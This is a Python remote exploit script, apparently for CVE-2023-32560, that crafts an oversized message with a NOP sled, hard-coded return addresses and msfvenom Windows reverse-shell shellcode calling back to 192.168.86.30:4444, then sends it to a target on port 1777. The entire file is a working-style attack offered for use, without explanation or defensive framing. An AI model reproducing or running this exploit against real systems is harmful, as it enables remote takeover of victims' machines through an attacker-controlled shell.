import socket
import struct
import sys

class Item:
    def __init__(self, type_, name, value):
        self.type = type_
        self.name = name.encode()
        self.value = value
        self.name_size = 0x5
        self.value_size = 0x800

    def pack(self):
        return struct.pack('>III{}s{}s'.format(self.name_size, self.value_size),
                           self.type, self.name_size, self.value_size, self.name, self.value)

class HP:
    def __init__(self, hdr, payload):
        self.hdr = hdr
        self.payload = payload
        self.pad = b'\x00' * (16 - (len(self.hdr) + len(self.payload)) % 16)

    def pack(self):
        return b''.join([item.pack() for item in self.hdr]) + \
               b''.join([item.pack() for item in self.payload]) + self.pad


class Preamble:
    def __init__(self, hp):
        self.msg_size = len(hp.pack()) + 16
        self.hdr_size = sum([len(item.pack()) for item in hp.hdr])
        self.payload_size = sum([len(item.pack()) for item in hp.payload])
        self.unk = 0  

    def pack(self):
        return struct.pack('>IIII', self.msg_size, self.hdr_size, self.payload_size, self.unk)


class Msg:
    def __init__(self, hp):
        self.pre = Preamble(hp)
        self.hdrpay = hp

    def pack(self):
        return self.pre.pack() + self.hdrpay.pack()

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.86.30 LPORT=4444 exitfunc=thread -f python
shellcode =  b""
shellcode += b"fce8820000006089e531c064"
shellcode += b"8b50308b520c8b52148b7228"
shellcode += b"0fb74a2631ffac3c617c022c"
shellcode += b"20c1cf0d01c7e2f252578b52"
shellcode += b"108b4a3c8b4c1178e34801d1"
shellcode += b"518b592001d38b4918e33a49"
shellcode += b"8b348b01d631ffacc1cf0d01"
shellcode += b"c738e075f6037df83b7d2475"
shellcode += b"e4588b582401d3668b0c4b8b"
shellcode += b"581c01d38b048b01d0894424"
shellcode += b"245b5b61595a51ffe05f5f5a"
shellcode += b"8b12eb8d5d68333200006877"
shellcode += b"73325f54684c772607ffd5b8"
shellcode += b"9001000029c454506829806b"
shellcode += b"00ffd5505050504050405068"
shellcode += b"ea0fdfe0ffd5976a0568c0a8"
shellcode += b"561e680200115c89e66a1056"
shellcode += b"576899a57461ffd585c0740c"
shellcode += b"ff4e0875ec68f0b5a256ffd5"
shellcode += b"68636d640089e357575731f6"
shellcode += b"6a125956e2fd66c744243c01"
shellcode += b"018d442410c6004454505656"
shellcode += b"5646564e565653566879cc3f"
shellcode += b"86ffd589e04e5646ff306808"
shellcode += b"871d60ffd5bbe01d2a0a68a6"
shellcode += b"95bd9dffd53c067c0a80fbe0"
shellcode += b"7505bb4713726f6a0053ffd5"

buf = b'90' * 340
buf += b'812b4100' 
buf += b'90909090'
buf += b'90909090'
buf += shellcode
buf += b'41' * 80
buf += b'84d45200' 
buf += b'43' * (0x800 - len(buf))

buf2 = b'41' * 0x1000

hdr = [Item(3, "pwned", buf)]
payload = [Item(3, "pwned", buf2)] 
hp_instance = HP(hdr, payload)
msg_instance = Msg(hp_instance)

port = 1777


if len(sys.argv) > 1:
    host = sys.argv[1]
else:
    print("Usage: python3 CVE-2023-32560.py <host ip>")
    sys.exit()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(msg_instance.pack())
    print("Message sent!")
    s.close()
